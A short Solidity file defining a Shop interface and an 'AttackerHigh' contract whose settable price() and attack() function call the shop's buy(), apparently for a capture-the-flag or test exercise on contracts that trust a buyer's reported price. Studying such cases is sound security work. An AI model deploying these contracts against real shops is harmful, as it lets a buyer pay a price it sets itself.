interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackerHigh {
    uint256 private _price = 200;

    function price() external view returns (uint256) {
        return _price;
    }

    function setPrice(uint256 newPrice) external {
        _price = newPrice;
    }

    function attack(Shop _shop) external {
        _shop.buy();
    }
}
